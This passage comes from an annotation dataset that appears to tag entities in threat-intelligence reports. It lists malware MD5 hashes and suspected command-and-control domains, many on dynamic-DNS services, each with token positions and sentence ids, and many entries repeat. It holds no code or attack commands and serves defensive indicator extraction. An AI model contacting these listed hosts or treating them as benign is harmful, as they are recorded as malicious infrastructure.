"dongtaiwang.vicp.net", "pos": [8, 9], "sent_id": 177, "type": "Indicator"}], [{"name": "dongtaiwang.vicp.net", "pos": [8, 9], "sent_id": 177, "type": "Indicator"}], [{"name": "apple.buypn.com", "pos": [9, 10], "sent_id": 177, "type": "Indicator"}], [{"name": "apple.buypn.com", "pos": [9, 10], "sent_id": 177, "type": "Indicator"}], [{"name": "apple.buypn.com", "pos": [9, 10], "sent_id": 177, "type": "Indicator"}], [{"name": "64c28ef1701a21e631c2089284eb6da5", "pos": [35, 36], "sent_id": 228, "type": "MD5"}], [{"name": "65f9e138947d288c8e9426d820db6eea", "pos": [0, 1], "sent_id": 229, "type": "MD5"}], [{"name": "6848f8440227d06a308655f7638a6bee", "pos": [0, 1], "sent_id": 230, "type": "MD5"}], [{"name": "6a31e0f0a058e182aaebe512d12803d3", "pos": [0, 1], "sent_id": 231, "type": "MD5"}], [{"name": "6a4b549ca3689b71d26702335d95a842", "pos": [0, 1], "sent_id": 232, "type": "MD5"}], [{"name": "6aa3ba5dd70a19745de9a8558648ef2d", "pos": [0, 1], "sent_id": 233, "type": "MD5"}], [{"name": "6af3587423d3afae735bebcd882d147a", "pos": [1, 2], "sent_id": 233, "type": "MD5"}], [{"name": "6e13a34dcfefa70ba341759c6636a951", "pos": [0, 1], "sent_id": 234, "type": "MD5"}], [{"name": "6e913d943a1e79af2990cc13d28344ac", "pos": [0, 1], "sent_id": 235, "type": "MD5"}], [{"name": "71ca1cae7ad22313ed14ad7e312b432f", "pos": [1, 2], "sent_id": 235, "type": "MD5"}], [{"name": "74a83fa5c9698019204432e99ce60fae", "pos": [0, 1], "sent_id": 236, "type": "MD5"}], [{"name": "75b8916a63ec1b4bb46ffeb755bc6641", "pos": [1, 2], "sent_id": 236, "type": "MD5"}], [{"name": "77d94d99bf89bd2421efd0d66ebcf25a", "pos": [2, 3], "sent_id": 236, "type": "MD5"}], [{"name": "798d926306e2e328f8147dc31b37d148", "pos": [0, 1], "sent_id": 237, "type": "MD5"}], [{"name": "7b13fd4d47c7e789a94bd304070af13a", "pos": [0, 1], "sent_id": 238, "type": "MD5"}], [{"name": "864fffd48523d9cbcd24917f7a54dc3d", "pos": [1, 2], "sent_id": 238, "type": "MD5"}], [{"name": "8651d46164a52da00188ad7760342b23", "pos": [2, 3], "sent_id": 238, "type": "MD5"}], [{"name": "86fa2e505cbbe4abf94b891caf46ec6e", "pos": [3, 4], "sent_id": 238, "type": "MD5"}], [{"name": "884323fc4c51e4ce4cc258fce243672a", "pos": [0, 1], "sent_id": 239, "type": "MD5"}], [{"name": "891d15fd331f79829acb489617333b79", "pos": [0, 1], "sent_id": 240, "type": "MD5"}], [{"name": "8cd87b8d5ca0715d1605a70f500924bb", "pos": [1, 2], "sent_id": 240, "type": "MD5"}], [{"name": "8f1073b2dba950152fd96a4c5057bc13", "pos": [2, 3], "sent_id": 240, "type": "MD5"}], [{"name": "9322ff4e14f75fe3ea032714b5038c20", "pos": [3, 4], "sent_id": 240, "type": "MD5"}], [{"name": "93a98e2049ffe3ba660b0eab8827f8bb", "pos": [4, 5], "sent_id": 240, "type": "MD5"}], [{"name": "96181a03770b612c5f4a57194018ef30", "pos": [0, 1], "sent_id": 241, "type": "MD5"}], [{"name": "97da1db01d59f2852989a3c152ed39c1", "pos": [0, 1], "sent_id": 242, "type": "MD5"}], [{"name": "981f9c704c671dc36cf553c4bb620ea7", "pos": [0, 1], "sent_id": 243, "type": "MD5"}], [{"name": "9c8f0ce512cdb21bf4e4953094bd1e46", "pos": [0, 1], "sent_id": 244, "type": "MD5"}], [{"name": "9e2dfa8c509ee179d2283fbe8512b6dd", "pos": [0, 1], "sent_id": 245, "type": "MD5"}], [{"name": "9f6143aa4b6f50d28f858c70388a3c73", "pos": [1, 2], "sent_id": 245, "type": "MD5"}], [{"name": "a079ff3fd8fbc398f0361f9105e93733", "pos": [0, 1], "sent_id": 246, "type": "MD5"}], [{"name": "a3bfba7870d87f726bb97a85db17942c", "pos": [1, 2], "sent_id": 246, "type": "MD5"}], [{"name": "a3ce301622f326fe436e3f275ab7d1be", "pos": [2, 3], "sent_id": 246, "type": "MD5"}], [{"name": "a51628c49fc15bec7363d598d749934d", "pos": [3, 4], "sent_id": 246, "type": "MD5"}], [{"name": "a66fc5a5b1b7fe127140386d784a3e80", "pos": [0, 1], "sent_id": 247, "type": "MD5"}], [{"name": "a77fe3562f1c89a1263edbbedec56ca4", "pos": [1, 2], "sent_id": 247, "type": "MD5"}], [{"name": "a791342a49c08d22b1a1bd7a93328d77", "pos": [2, 3], "sent_id": 247, "type": "MD5"}], [{"name": "a84e6d38f43f0ca50c60731fa6f8f8cc", "pos": [3, 4], "sent_id": 247, "type": "MD5"}], [{"name": "ab8be1ed0d1c2ec03c847d43434551f0", "pos": [4, 5], "sent_id": 247, "type": "MD5"}], [{"name": "aee71a96f11c183c0ddd424228376dbc", "pos": [5, 6], "sent_id": 247, "type": "MD5"}], [{"name": "b18f2c7c1631d94457e3c3226692a5b4", "pos": [6, 7], "sent_id": 247, "type": "MD5"}], [{"name": "b52f72a86b621948f1b094334d23c50f", "pos": [7, 8], "sent_id": 247, "type": "MD5"}], [{"name": "b7597172097e4105f027e2c65d2eaf64", "pos": [8, 9], "sent_id": 247, "type": "MD5"}], [{"name": "b7fb766f3ab6926d9f42c91b649a2943", "pos": [9, 10], "sent_id": 247, "type": "MD5"}], [{"name": "bbda06be8132e34c5d91e08e55a4d814", "pos": [0, 1], "sent_id": 248, "type": "MD5"}], [{"name": "bf0aa8e722df5e1f8124d51021206622", "pos": [0, 1], "sent_id": 249, "type": "MD5"}], [{"name": "bf87188b9af91a054053ec1becd6eaf0", "pos": [1, 2], "sent_id": 249, "type": "MD5"}], [{"name": "c030d67c8696b9cbcc600867363ef9bd", "pos": [2, 3], "sent_id": 249, "type": "MD5"}], [{"name": "c7534dcb83991745ab5db0aba47d47cd", "pos": [3, 4], "sent_id": 249, "type": "MD5"}], [{"name": "c839ab78db5a0b8715a4f829c845a9c2", "pos": [4, 5], "sent_id": 249, "type": "MD5"}], [{"name": "cc10483d846bffbe19f133f951eb908c", "pos": [5, 6], "sent_id": 249, "type": "MD5"}], [{"name": "cc5ba76ee1cf77f7547632f44c517673", "pos": [0, 1], "sent_id": 250, "type": "MD5"}], [{"name": "cf30b0d831d3123027a20520a213a09f", "pos": [1, 2], "sent_id": 250, "type": "MD5"}], [{"name": "cf7df0a7a87fa110262b26571438969d", "pos": [0, 1], "sent_id": 251, "type": "MD5"}], [{"name": "d0bc80cb9522ff749185f5493b89dfa1", "pos": [1, 2], "sent_id": 251, "type": "MD5"}], [{"name": "d52ef63fdc5c5452d9da23bd6d4bf0f5", "pos": [2, 3], "sent_id": 251, "type": "MD5"}], [{"name": "qq907433815.3322.org", "pos": [7, 8], "sent_id": 251, "type": "Indicator"}], [{"name": "qq907433815.3322.org", "pos": [7, 8], "sent_id": 251, "type": "Indicator"}], [{"name": "qq907433815.3322.org", "pos": [7, 8], "sent_id": 251, "type": "Indicator"}], [{"name": "qq907433815.3322.org", "pos": [7, 8], "sent_id": 251, "type": "Indicator"}], [{"name": "sm888.8800.org", "pos": [0, 1], "sent_id": 253, "type": "Indicator"}], [{"name": "sm888.8800.org", "pos": [0, 1], "sent_id": 253, "type": "Indicator"}], [{"name": "okia.3322.org", "pos": [6, 7], "sent_id": 254, "type": "Indicator"}], [{"name": "okia.3322.org", "pos": [6, 7], "sent_id": 254, "type": "Indicator"}], [{"name": "okia.3322.org", "pos": [6, 7], "sent_id": 254, "type": "Indicator"}], [{"name": "okia.3322.org", "pos": [6, 7], "sent_id": 254, "type": "Indicator"}], [{"name": "dnsxyz.webhop.net", "pos": [1, 2], "sent_id": 255, "type": "Indicator"}], [{"name": "dnsxyz.webhop.net", "pos": [1, 2], "sent_id": 255, "type": "Indicator"}], [{"name": "i_lied@3322.org", "pos": [2, 3], "sent_id": 256, "type": "Indicator"}], [{"name": "northsince.homelinux.org", "pos": [11, 12], "sent_id": 256, "type": "Indicator"}], [{"name": "bysex.mooo.com", "pos": [1, 2], "sent_id": 257, "type": "Indicator"}], [{"name": "yahooforusa.vicp.net", "pos": [5, 6], "sent_id": 258, "type": "Indicator"}], [{"name": "yahooforusa.vicp.net", "pos": [5, 6], "sent_id": 258, "type": "Indicator"}], [{"name": "qwer.crabdance.com", "pos": [8, 9], "sent_id": 258, "type": "Indicator"}], [{"name": "qwer.crabdance.com", "pos": [8, 9], "sent_id": 258, "type": "Indicator"}], [{"name": "qwer.crabdance.com", "pos": [8, 9], "sent_id": 258, "type": "Indicator"}], [{"name": "qwer.crabdance.com", "pos": [8, 9], "sent_id": 258, "type": "Indicator"}], [{"name": "qwer.crabdance.com", "pos": [8, 9], "sent_id": 258, "type": "Indicator"}], [{"name": "qwer.crabdance.com", "pos": [8, 9], "sent_id": 258, "type": "Indicator"}], [{"name": "d6dbf1ff2d93e95a4379ecc5c71eb709", "pos": [20, 21], "sent_id": 316, "type": "MD5"}], [{"name": "d8097ba0e2077ebb841c7b98b48437fb", "pos": [21, 22], "sent_id": 316, "type": "MD5"}], [{"name": "db88d89c58f344308c37a08e913caf02", "pos": [22, 23], "sent_id": 316, "type": "MD5"}], [{"name": "dd016c17ea3e2dbdefe8bdcf73346cbd", "pos": [23, 24], "sent_id": 316, "type": "MD5"}], [{"name": "df41a63c679fe1374aa191ea892e5650", "pos": [24, 25], "sent_id": 316, "type": "MD5"}], [{"name": "e10152dd505853dddf59ae570e0a3abb", "pos": [25, 26], "sent_id": 316, "type": "MD5"}], [{"name": "e120cdb2811407c48e94098d2190d4e2", "pos": [26, 27], "sent_id": 316, "type": "MD5"}], [{"name": "e1ac803a816265db2ace8140e06edad3", "pos": [27, 28], "sent_id": 316, "type": "MD5"}], [{"name": "e3984f30a5362bd97a15915bb8ac3ea4", "pos": [28, 29], "sent_id": 316, "type": "MD5"}], [{"name": "e3b16d46c81fc7ae23738795cf38f671", "pos": [29, 30], "sent_id": 316, "type": "MD5"}], [{"name": "e53f502d82d2ac5558ff59a6f8038db7", "pos": [30, 31], "sent_id": 316, "type": "MD5"}], [{"name": "e6408b5120fb53769e8e6faa084966a3", "pos": [31, 32], "sent_id": 316, "type": "MD5"}], [{"name": "e78ddb3a1c715a5c93d064bd053a570d", "pos": [32, 33], "sent_id": 316, "type": "MD5"}], [{"name": "ea9ff690b68eac6904931b0ab1c60fd4", "pos": [33, 34], "sent_id": 316, "type": "MD5"}], [{"name": "ed517981e73a616ba4ab60a16c94cfe0", "pos": [34, 35], "sent_id": 316, "type": "MD5"}], [{"name": "f08ca265043bba868ff3133ca9bc74cc", "pos": [35, 36], "sent_id": 316, "type": "MD5"}], [{"name": "f2414a1a3994faf0a2a6a68c5e02c7b2", "pos": [36, 37], "sent_id": 316, "type": "MD5"}], [{"name": "f3b3438a1a69e7290823492c517a8ee7", "pos": [37, 38], "sent_id": 316, "type": "MD5"}], [{"name": "f6df06b5d97cc9185a4b6d3bf36df8dd", "pos": [38, 39], "sent_id": 316, "type": "MD5"}], [{"name": "f71627384a8b41062de77ba9aa32928b", "pos": [39, 40], "sent_id": 316, "type": "MD5"}], [{"name": "f9eadd5762a634fa703956be48aa69c0", "pos": [40, 41], "sent_id": 316, "type": "MD5"}], [{"name": "fa3e62ec64d10a9accb2fa8c580a2efa", "pos": [41, 42], "sent_id": 316, "type": "MD5"}], [{"name": "fa72e26105b43349b4b50d127d3614a3", "pos": [42, 43], "sent_id": 316, "type": "MD5"}], [{"name": "fad40c701654454f2b1a4abc7c707c06", "pos": [43, 44], "sent_id": 316, "type": "MD5"}], [{"name": "0344fb12551a2721ce1642ebbaded310", "pos": [44, 45], "sent_id": 316, "type": "MD5"}], [{"name": "0b7c0a464f8eba9da0073bcafb61be88", "pos": [45, 46], "sent_id": 316, "type": "MD5"}], [{"name": "128b4d567b1474949c4389785397cc1b", "pos": [46, 47], "sent_id": 316, "type": "MD5"}], [{"name": "1b1d855a357c337ea3fdf015265b1445", "pos": [47, 48], "sent_id": 316, "type": "MD5"}], [{"name": "1ddda11f7521c092ea6095ac3919676d", "pos": [0, 1], "sent_id": 317, "type": "MD5"}], [{"name": "364c806a053f29f5dd175d09f373250a", "pos": [1, 2], "sent_id": 317, "type": "MD5"}], [{"name": "391479e5579206b6831e00bbf7c99826", "pos": [2, 3], "sent_id": 317, "type": "MD5"}], [{"name": "474da1e418763cf0c9fcc0ddecc99928", "pos": [3, 4], "sent_id": 317, "type": "MD5"}], [{"name": "4e94978943a8c8d41c9b66fa4dc6cfaf", "pos": [0, 1], "sent_id": 318, "type": "MD5"}], [{"name": "51de6aad847ba7b38cd7aca8783b1c81", "pos": [1, 2], "sent_id": 318, "type": "MD5"}], [{"name": "5a953c5a922885ac0bbb3f8abbecdc2e", "pos": [2, 3], "sent_id": 318, "type": "MD5"}], [{"name": "5da12bdd0c23862b68d9599faa4caad7", "pos": [3, 4], "sent_id": 318, "type": "MD5"}], [{"name": "728365a26dc9600ef10b2abd5fa11afd", "pos": [4, 5], "sent_id": 318, "type": "MD5"}], [{"name": "72c28b58aebc7ab97008f803ade71c76", "pos": [0, 1], "sent_id": 319, "type": "MD5"}], [{"name": "7b019bd7e91874692b510fa8c218e5d9", "pos": [0, 1], "sent_id": 320, "type": "MD5"}], [{"name": "8df121cd3b79db7ae772b32d70f6c9d8", "pos": [1, 2], "sent_id": 320, "type": "MD5"}], [{"name": "90acf5aba3170978dc585640f34d74d3", "pos": [0, 1], "sent_id": 321, "type": "MD5"}], [{"name": "a6fd61ed931dccc961635b8e43f35215", "pos": [0, 1], "sent_id": 322, "type": "MD5"}], [{"name": "b6f732c391d34acba419f20eba8efebd", "pos": [0, 1], "sent_id": 323, "type": "MD5"}], [{"name": "bb2185d8eae91fc105a4d92c6f9cec74", "pos": [0, 1], "sent_id": 324, "type": "MD5"}], [{"name": "cddae65009d91d88b49fd6eebd0b28e7", "pos": [1, 2], "sent_id": 324, "type": "MD5"}], [{"name": "dcf85cd73cca9fc032e055be18375d9a", "pos": [0, 1], "sent_id": 325, "type": "MD5"}], [{"name": "f175f7598648471d085f1909d36390ce", "pos": [1, 2], "sent_id": 325, "type": "MD5"}], [{"name": "f5c939f6973acae6160b92f32bb2dd27", "pos": [2, 3], "sent_id": 325, "type": "MD5"}], [{"name": "f615afeffe7b8da50712f2ef40aff6b9", "pos": [3, 4], "sent_id": 325, "type": "MD5"}], [{"name": "fca5b719d18b950e59c6bc66f71e7274", "pos": [4, 5], "sent_id": 325, "type": "MD5"}], [{"name": "17981807f7394d78f984b9104584e3ab", "pos": [5, 6], "sent_id": 325, "type": "MD5"}], [{"name": "2da5243310403b7fdedbf2911d09ec24", "pos": [6, 7], "sent_id": 325, "type": "MD5"}], [{"name": "559f72390ecb028d799b0aea594c9b7d", "pos": [7, 8], "sent_id": 325, "type": "MD5"}], [{"name": "070e0226f5d0d588731361c0b5569379", "pos": [8, 9], "sent_id": 325, "type": "MD5"}], [{"name": "0f482f1acabe3a980705d66cd6e4bf52", "pos": [9, 10], "sent_id": 325, "type": "MD5"}], [{"name": "16d2175d190bbbd572cb3e33079f7d72", "pos": [0, 1], "sent_id": 326, "type": "MD5"}], [{"name": "5cc4daa7d3bd4b17c8067ec8a947ce83", "pos": [0, 1], "sent_id": 327, "type": "MD5"}], [{"name": "84b5f0cfc4a787d013d8f0f605a876c3", "pos": [0, 1], "sent_id": 328, "type": "MD5"}], [{"name": "yzkker.3322.org", "pos": [3, 4], "sent_id": 331, "type": "Indicator"}], [{"name": "a2ce5549749d258a3d53a19ebf0dfef9", "pos": [38, 39], "sent_id": 395, "type": "MD5"}], [{"name": "acf4d4159bcb730a6c86469b74326181", "pos": [39, 40], "sent_id": 395, "type": "MD5"}], [{"name": "f75009f6423433db2fc5673ab278e3d1", "pos": [0, 1], "sent_id": 396, "type": "MD5"}], [{"name": "68411315d3321b744552f50d15a97308", "pos": [1, 2], "sent_id": 396, "type": "MD5"}], [{"name": "008dc2e22ba7e6f96342a29083344512", "pos": [2, 3], "sent_id": 396, "type": "MD5"}], [{"name": "00fd48c9ddeb7c7b9271f4a6e0ca4a16", "pos": [0, 1], "sent_id": 397, "type": "MD5"}], [{"name": "036a2da8bde3af55f8c492afeeddd65b", "pos": [1, 2], "sent_id": 397, "type": "MD5"}], [{"name": "069120f92ffadbfb2a22c6e51a257236", "pos": [2, 3], "sent_id": 397, "type": "MD5"}], [{"name": "06f788c2e5285e63545baad22af2e5ce", "pos": [3, 4], "sent_id": 397, "type": "MD5"}], [{"name": "06f9e365fe8bbe926c5fd992d1ff4b95", "pos": [4, 5], "sent_id": 397, "type": "MD5"}], [{"name": "09e49a46ffc9135682740ef0b709a28a", "pos": [0, 1], "sent_id": 398, "type": "MD5"}], [{"name": "0efb08ce780b5a50749f850805e2d663", "pos": [0, 1], "sent_id": 399, "type": "MD5"}], [{"name": "1d35952034267cb1a865ad4f8b76a22c", "pos": [1, 2], "sent_id": 399, "type": "MD5"}], [{"name": "1e8a59cd725d949a140497d0462b63c7", "pos": [0, 1], "sent_id": 400, "type": "MD5"}], [{"name": "21013250e90e559c0b5ab7fd5cd57722", "pos": [1, 2], "sent_id": 400, "type": "MD5"}], [{"name": "22b6fbae0b2ecfb51c194b98c1cff692", "pos": [2, 3], "sent_id": 400, "type": "MD5"}], [{"name": "24f09152a40c5231f9e006ca3a27dbbb", "pos": [3, 4], "sent_id": 400, "type": "MD5"}], [{"name": "2530c356ccaa7272a56145b7300daf80", "pos": [4, 5], "sent_id": 400, "type": "MD5"}], [{"name": "269fa8fa755b6d067e9818f89b182042", "pos": [5, 6], "sent_id": 400, "type": "MD5"}], [{"name": "26eaf715124382f1ca0c29fc3661d00c", "pos": [6, 7], "sent_id": 400, "type": "MD5"}], [{"name": "2bd6d0231789b1b207bd18c93fe877bb", "pos": [0, 1], "sent_id": 401, "type": "MD5"}], [{"name": "2c7ff79125c4b1f02a436010cfd71b21", "pos": [0, 1], "sent_id": 402, "type": "MD5"}], [{"name": "2defc101ebccce4baa9779f4fcef53bb", "pos": [1, 2], "sent_id": 402, "type": "MD5"}], [{"name": "304e3b07f1d1802488ed80a5be1eaf8d", "pos": [2, 3], "sent_id": 402, "type": "MD5"}], [{"name": "317da2fd6635b45570edb2c2df75b0fe", "pos": [3, 4], "sent_id": 402, "type": "MD5"}], [{"name": "31b188114c8a75d117e129b2446a9310", "pos": [4, 5], "sent_id": 402, "type": "MD5"}], [{"name": "320cd6bb76a8cb768de42ba6697e7590", "pos": [0, 1], "sent_id": 403, "type": "MD5"}], [{"name": "3215133be590fa47089989502381ca31", "pos": [1, 2], "sent_id": 403, "type": "MD5"}], [{"name": "34156792fac87719e9c8a4665fe2f9b9", "pos": [0, 1], "sent_id": 404, "type": "MD5"}], [{"name": "36895b649536ed3905d3f90e2004f03b", "pos": [1, 2], "sent_id": 404, "type": "MD5"}], [{"name": "375b6d4987d015ebf9414c19681001ba", "pos": [2, 3], "sent_id": 404, "type": "MD5"}], [{"name": "37f95b4906fb3b6f5935e2a397f69e21", "pos": [3, 4], "sent_id": 404, "type": "MD5"}], [{"name": "3c6cce8b6f8d55d931959d39044fab76", "pos": [4, 5], "sent_id": 404, "type": "MD5"}], [{"name": "40fcdebb382907cbbfaee44f154ecb02", "pos": [0, 1], "sent_id": 405, "type": "MD5"}], [{"name": "425ee721db80ce85b338a073b37c2e12", "pos": [0, 1], "sent_id": 406, "type": "MD5"}], [{"name": "45f569bc817a17f0e0487bb05ae71137", "pos": [1, 2], "sent_id": 406, "type": "MD5"}], [{"name": "485ecdaa0482b35f510f40f3b2f683ff", "pos": [0, 1], "sent_id": 407, "type": "MD5"}], [{"name": "4c84d6447587330d544f5200196f2603", "pos": [0, 1], "sent_id": 408, "type": "MD5"}], [{"name": "4d0b6f59628d4d3fba569315140dedde", "pos": [1, 2], "sent_id": 408, "type": "MD5"}], [{"name": "52dd8f9a8be5692014186af755a9257d", "pos": [0, 1], "sent_id": 409, "type": "MD5"}], [{"name": "574d3725d5f161b8f7615d8867ee427e", "pos": [1, 2], "sent_id": 409, "type": "MD5"}], [{"name": "605accc6bee731be5ac0f6531ac9e8d7", "pos": [2, 3], "sent_id": 409, "type": "MD5"}], [{"name": "66cfc9d3c6fa3107b0d004789384a6bd", "pos": [0, 1], "sent_id": 410, "type": "MD5"}], [{"name": "6b009e689cad6896d28102af04569bf2", "pos": [1, 2], "sent_id": 410, "type": "MD5"}], [{"name": "6b475742f795fe8b6439bd931dccf045", "pos": [2, 3], "sent_id": 410, "type": "MD5"}], [{"name": "6e218ced252ca18ea12a58e8c14ae618", "pos": [0, 1], "sent_id": 411, "type": "MD5"}], [{"name": "747ad8a7bc8ded87169d1bd40d4f3aa3", "pos": [0, 1], "sent_id": 412, "type": "MD5"}], [{"name": "765b599cb055df9034b71e54c795193e", "pos": [1, 2], "sent_id": 412, "type": "MD5"}], [{"name": "7ca3acf38cf256650aa8c15ef51fd7cc", "pos": [2, 3], "sent_id": 412, "type": "MD5"}], [{"name": "7ccaf82b2594c18f368aa94536448aa3", "pos": [3, 4], "sent_id": 412, "type": "MD5"}], [{"name": "83213cf9fe303d916789cef295d07b6b", "pos": [4, 5], "sent_id": 412, "type": "MD5"}], [{"name": "84c23286b9b141d2f501a55228de96ee", "pos": [5, 6], "sent_id": 412, "type": "MD5"}], [{"name": "8d6b5815157422ee97c01925d72a22ed", "pos": [6, 7], "sent_id": 412, "type": "MD5"}], [{"name": "919e4ddef8f294dfeb798f7a5e34ba39", "pos": [0, 1], "sent_id": 413, "type": "MD5"}], [{"name": "9c29b5ab62f130dedb52e7661a8b3cb3", "pos": [1, 2], "sent_id": 413, "type": "MD5"}], [{"name": "9ec832ed678e81a8e0a2c253beeadd00", "pos": [2, 3], "sent_id": 413, "type": "MD5"}], [{"name": "9f55bc93d26ec674e754545be9513f3d", "pos": [0, 1], "sent_id": 414, "type": "MD5"}], [{"name": "9ffd9fb7b493aec58f88b823a426d1b0", "pos": [0, 1], "sent_id": 415, "type": "MD5"}], [{"name": "oa.sanymh.com", "pos": [0, 1], "sent_id": 417, "type": "Indicator"}], [{"name": "oa.sanymh.com", "pos": [0, 1], "sent_id": 417, "type": "Indicator"}], [{"name": "black204.dyndns-work.com", "pos": [0, 1], "sent_id": 418, "type": "Indicator"}], [{"name": "black204.dyndns-work.com", "pos": [0, 1], "sent_id": 418, "type": "Indicator"}], [{"name": "black204.dyndns-work.com", "pos": [0, 1], "sent_id": 418, "type": "Indicator"}], [{"name": "black204.dyndns-work.com", "pos": [0, 1], "sent_id": 418, "type": "Indicator"}], [{"name": "black204.dyndns-work.com", "pos": [0, 1], "sent_id": 418, "type": "Indicator"}], [{"name": "black204.dyndns-work.com", "pos": [0, 1], "sent_id": 418, "type": "Indicator"}], [{"name": "black204.dyndns-work.com", "pos": [0, 1], "sent_id": 418, "type": "Indicator"}], [{"name": "dyn-microsoft.blogdns.net", "pos": [1, 2], "sent_id": 418, "type": "Indicator"}], [{"name": "dyn-microsoft.blogdns.net", "pos": [1, 2], "sent_id": 418, "type": "Indicator"}], [{"name": "dyn-microsoft.blogdns.net", "pos": [1, 2], "sent_id": 418, "type": "Indicator"}], [{"name": "boyfriend101.kicks-ass.org", "pos": [2, 3], "sent_id": 418, "type": "Indicator"}], [{"name": "boyfriend101.kicks-ass.org", "pos": [2, 3], "sent_id": 418, "type": "Indicator"}], [{"name": "boyfriend101.kicks-ass.org", "pos": [2, 3], "sent_id": 418, "type": "Indicator"}], [{"name": "boyfriend101.kicks-ass.org", "pos": [2, 3], "sent_id": 418, "type": "Indicator"}], [{"name": "boyfriend101.kicks-ass.org", "pos": [2, 3], "sent_id": 418, "type": "Indicator"}], [{"name": "boyfriend101.kicks-ass.org", "pos": [2, 3], "sent_id": 418, "type": "Indicator"}], [{"name": "boyfriend101.kicks-ass.org", "pos": [2, 3], "sent_id": 418, "type": "Indicator"}], [{"name": "fh.buypn.com", "pos": [3, 4], "sent_id": 418, "type": "Indicator"}], [{"name": "fh.buypn.com", "pos": [3, 4], "sent_id": 418, "type": "Indicator"}], [{"name": "fh.buypn.com", "pos": [3, 4], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "dongdong603.3322.org", "pos": [4, 5], "sent_id": 418, "type": "Indicator"}], [{"name": "subscription.dyndns-home.com", "pos": [0, 1], "sent_id": 420, "type": "Indicator"}], [{"name": "subscription.dyndns-home.com", "pos": [0, 1], "sent_id": 420, "type": "Indicator"}], [{"name": "subscription.dyndns-home.com", "pos": [0, 1], "sent_id": 420, "type": "Indicator"}], [{"name": "subscription.dyndns-home.com", "pos": [0, 1], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 420, "type": "Indicator"}], [{"name": "a5g17mail.3322.org", "pos": [2, 3], "sent_id": 